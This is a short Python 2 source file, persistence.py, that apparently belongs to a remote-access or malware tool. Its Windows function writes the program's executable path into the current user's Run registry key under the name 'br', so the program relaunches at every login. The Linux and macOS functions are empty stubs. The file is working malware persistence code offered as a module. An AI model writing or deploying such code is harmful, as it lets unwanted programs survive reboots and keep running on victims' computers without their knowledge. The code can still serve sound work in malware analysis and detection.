# -*- coding: utf-8 -*-
# @Title   : 
# @Time    : 2018/7/16 10:05
# @Author  : Xifeng2009
# @Email   : 834935292@qq.com
# @File    : persistence.py
# @Software: PyCharm

import sys

def windows_persistence():
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU

    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    bin_path = sys.executable

    try:
        reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(reg_key, 'br', 0, _winreg.REG_SZ, bin_path)
        _winreg.CloseKey(reg_key)
        return True, "HKCU Run Registry Key Applied."
    except WindowsError:
        return False, "HKCU Run Registry Key Failed."

def linux_persistence(): # TODO
    return False, 'Nothing Here Yet.'

def mac_persistence(): # TODO
    return False, "Nothing Here Yet."

def run(plat):
    if plat == 'win':
        success, details = windows_persistence()
    elif plat == 'nix':
        success, details = linux_persistence()
    elif plat == 'mac':
        success, details = mac_persistence()
    else:
        return "Error, Platform unsupported."

    if success:
        results = "Persistence Successful, {}.".format(details)
    else:
        results = "Persistence Unsuccessful, {}.".format(details)
    return results